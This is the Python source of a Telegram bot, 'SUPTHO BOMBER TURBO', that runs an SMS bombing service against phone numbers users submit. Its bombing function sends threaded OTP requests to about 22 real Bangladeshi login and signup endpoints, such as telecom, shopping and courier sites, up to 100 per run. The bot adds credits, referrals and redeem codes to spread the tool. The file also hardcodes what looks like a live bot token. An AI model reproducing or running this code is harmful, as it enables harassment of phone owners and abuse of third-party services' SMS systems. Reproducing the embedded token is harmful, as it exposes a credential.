import telebot
import requests
import threading
import time
import json
import random
import string
import os
import html
from flask import Flask
from telebot import types

# ==========================================
# 🔧 CONFIGURATION
# ==========================================
API_TOKEN = '8577991344:AAGdkMNIt1v-bSBgsQKQSjGOtaklWAYn5NI'  # Bot Token boshon
OWNER_ID = 6941003064              # Apnar ID boshon
OWNER_USERNAME = "Suptho1"
CHANNEL_ID = "@SH_tricks"
DATA_FILE = 'bot_data.json'

bot = telebot.TeleBot(API_TOKEN)
stop_flags = {}

# ==========================================
# 💾 DATABASE MANAGER
# ==========================================
def load_data():
    if not os.path.exists(DATA_FILE):
        return {"users": {}, "codes": [], "whitelist": [], "banned": []}
    try:
        with open(DATA_FILE, 'r') as f: return json.load(f)
    except: return {"users": {}, "codes": [], "whitelist": [], "banned": []}

def save_data(data):
    with open(DATA_FILE, 'w') as f: json.dump(data, f, indent=4)

db = load_data()

# ==========================================
# 🌐 WEB SERVER (Keep Alive)
# ==========================================
app = Flask('')
@app.route('/')
def home(): return "Turbo Engine Online"
def run_web_server(): app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
def keep_alive(): threading.Thread(target=run_web_server, daemon=True).start()

# ==========================================
# 🛡️ SYSTEM HELPERS
# ==========================================
def is_joined(user_id):
    try:
        status = bot.get_chat_member(CHANNEL_ID, user_id).status
        return status in ['member', 'administrator', 'creator']
    except: return False

def get_user(user_id):
    uid = str(user_id)
    if uid not in db['users']:
        db['users'][uid] = {"credits": 5, "joined": True}
        save_data(db)
    return db['users'][uid]

# ==========================================
# 🚀 TURBO API ENGINE (27+ APIs)
# ==========================================
def api_hit(url, method, data=None, json_data=None):
    try:
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        if method == "POST": requests.post(url, data=data, json=json_data, headers=headers, timeout=2)
        else: requests.get(url, headers=headers, timeout=2)
    except: pass

def bombing_task(target, amount, call_id):
    global stop_flags
    stop_flags[call_id] = False
    sent = 0
    
    while sent < amount and not stop_flags.get(call_id, False):
        # API List (One by one fast execution)
        apis = [
            lambda: api_hit("https://api.apex4u.com/api/auth/login", "POST", json_data={"phoneNumber": target}),
            lambda: api_hit("https://shopbasebd.com/store/registration/sendOTP", "POST", data={"number": target}),
            lambda: api_hit(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={target}", "GET"),
            lambda: api_hit("https://web-api.banglalink.net/api/v1/user/otp-login/request", "POST", json_data={"mobile": target}),
            lambda: api_hit("https://webloginda.grameenphone.com/backend/api/v1/otp", "POST", data={"msisdn": target}),
            lambda: api_hit("https://api.retail.jatri.co/auth/api/v1/send-otp", "POST", json_data={"phone": target, "purpose": "USER_LOGIN"}),
            lambda: api_hit("https://prod-services.toffeelive.com/sms/v1/subscriber/otp", "POST", json_data={"target": "88"+target}),
            lambda: api_hit("https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web", "POST", json_data={"number": "+88"+target}),
            lambda: api_hit("https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code", "POST", json_data={"phoneNumber": "+88"+target}),
            lambda: api_hit("https://api.shikho.com/auth/v2/send/sms", "POST", json_data={"phone": "88"+target}),
            lambda: api_hit("https://api.ostad.app/api/v2/user/with-otp", "POST", json_data={"msisdn": target}),
            lambda: api_hit("https://api.osudpotro.com/api/v1/users/send_otp", "POST", json_data={"mobile": "+88-"+target}),
            lambda: api_hit("https://api.swap.com.bd/api/v1/send-otp", "POST", json_data={"phone": target}),
            lambda: api_hit(f"https://www.rokomari.com/otp/send?emailOrPhone=88{target}&countryCode=BD", "GET"),
            lambda: api_hit(f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={target}", "GET"),
            lambda: api_hit("https://prod-api.viewlift.com/identity/signup?site=prothomalo", "POST", json_data={"phoneNumber":"+88"+target}),
            lambda: api_hit("https://app.eonbazar.com/api/auth/register", "POST", json_data={"mobile": target}),
            lambda: api_hit("https://tracking.sundarbancourierltd.com/PreBooking/SendPin", "POST", json_data={"PreBookingRegistrationPhoneNumber": target}),
            lambda: api_hit("https://cokestudio23.sslwireless.com/api/store-and-send-otp", "POST", json_data={"msisdn": "88"+target}),
            lambda: api_hit("https://apix.rabbitholebd.com/appv2/login/requestOTP", "POST", json_data={"mobile": "+88"+target}),
            lambda: api_hit(f"https://fundesh.com.bd/api/auth/generateOTP", "POST", json_data={"msisdn": "88"+target}),
            lambda: api_hit("https://api.paragonfood.com.bd/auth/customerlogin", "POST", json_data={"emailOrPhone": target})
        ]
        
        for api in apis:
            if sent >= amount or stop_flags.get(call_id, False): break
            threading.Thread(target=api).start() # Threading for extreme speed
            sent += 1
        
        time.sleep(1) # Choto delay jate system crash na kore

# ==========================================
# 🤖 BOT UI & HANDLERS
# ==========================================

@bot.message_handler(commands=['start'])
def welcome(message):
    uid = str(message.from_user.id)
    get_user(uid)
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(types.KeyboardButton("🚀 Start Bomb"), types.KeyboardButton("💳 My Balance"))
    markup.add(types.KeyboardButton("👥 Refer & Earn"), types.KeyboardButton("💰 Redeem Credit"))
    markup.add(types.KeyboardButton("👑 Admin Support"))
    bot.send_message(message.chat.id, f"🔥 **SUPTHO BOMBER TURBO** 🔥\n👋 Swagotom!", reply_markup=markup)

@bot.message_handler(func=lambda m: True)
def handle_buttons(message):
    uid = str(message.from_user.id)
    if not is_joined(message.from_user.id):
        return bot.reply_to(message, f"❌ Join Channel First: {CHANNEL_ID}")
    
    if uid in db['banned']: return bot.reply_to(message, "🚫 You are Banned.")

    if message.text == "🚀 Start Bomb":
        msg = bot.reply_to(message, "💣 Target Number (11 Digit):")
        bot.register_next_step_handler(msg, ask_amount)
    elif message.text == "💳 My Balance":
        user = get_user(uid)
        cred = "Unlimited" if int(uid) == OWNER_ID else user['credits']
        bot.reply_to(message, f"💰 Balance: **{cred} Credits**", parse_mode='Markdown')
    elif message.text == "👥 Refer & Earn":
        link = f"https://t.me/{bot.get_me().username}?start={uid}"
        bot.reply_to(message, f"🎁 Refer Link: `{link}`\n\nPer Refer 5 Credit!", parse_mode='Markdown')
    elif message.text == "💰 Redeem Credit":
        msg = bot.reply_to(message, "🎁 Redeem Code Din:")
        bot.register_next_step_handler(msg, use_redeem)
    elif message.text == "👑 Admin Support":
        bot.reply_to(message, f"Owner: @{OWNER_USERNAME}")

def ask_amount(message):
    target = message.text.strip()
    if len(target) != 11: return bot.reply_to(message, "⚠️ 11 Digit Number Din.")
    msg = bot.reply_to(message, f"🎯 Target: `{target}`\n🔢 Amount (Max 100):")
    bot.register_next_step_handler(msg, start_bombing, target)

def start_bombing(message, target):
    uid = str(message.from_user.id)
    try:
        amount = int(message.text)
        if amount > 100: amount = 100
        
        if int(uid) != OWNER_ID:
            if db['users'][uid]['credits'] < 1: return bot.reply_to(message, "⚠️ No Credit.")
            db['users'][uid]['credits'] -= 1
            save_data(db)
        
        if target in db['whitelist']: return bot.reply_to(message, "🛡️ Protected Number.")

        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("⛔ STOP", callback_data=f"stop_{uid}"))
        bot.reply_to(message, f"🚀 Bombing Started on {target}!", reply_markup=markup)
        
        threading.Thread(target=bombing_task, args=(target, amount, f"stop_{uid}")).start()
    except: bot.reply_to(message, "❌ Invalid Amount.")

@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def stop_call(call):
    stop_flags[call.data] = True
    bot.edit_message_text("✅ Bombing Stopped.", call.message.chat.id, call.message.message_id)

def use_redeem(message):
    code = message.text.strip()
    if code in db['codes']:
        db['codes'].remove(code)
        db['users'][str(message.from_user.id)]['credits'] += 5
        save_data(db)
        bot.reply_to(message, "✅ 5 Credit Added!")
    else: bot.reply_to(message, "❌ Invalid Code.")

# ==========================================
# 👑 ADMIN PANEL
# ==========================================
@bot.message_handler(commands=['ban', 'unban', 'white', 'gencodes', 'broadcast'])
def admin_cmd(message):
    if message.from_user.id != OWNER_ID: return
    cmd = message.text.split()
    try:
        if cmd[0] == '/ban':
            db['banned'].append(cmd[1]); save_data(db); bot.reply_to(message, "Banned.")
        elif cmd[0] == '/unban':
            db['banned'].remove(cmd[1]); save_data(db); bot.reply_to(message, "Unbanned.")
        elif cmd[0] == '/white':
            db['whitelist'].append(cmd[1]); save_data(db); bot.reply_to(message, "Whitelisted.")
        elif cmd[0] == '/gencodes':
            num = int(cmd[1])
            codes = ["SUP-"+''.join(random.choices(string.ascii_uppercase + string.digits, k=6)) for _ in range(num)]
            db['codes'].extend(codes); save_data(db)
            bot.reply_to(message, f"Codes: `{codes}`", parse_mode='Markdown')
        elif cmd[0] == '/broadcast':
            msg = message.text.replace("/broadcast ", "")
            for u in db['users']: bot.send_message(u, f"📢 Notice: {msg}")
    except: bot.reply_to(message, "Error in command.")

if __name__ == "__main__":
    keep_alive()
    bot.polling(non_stop=True)
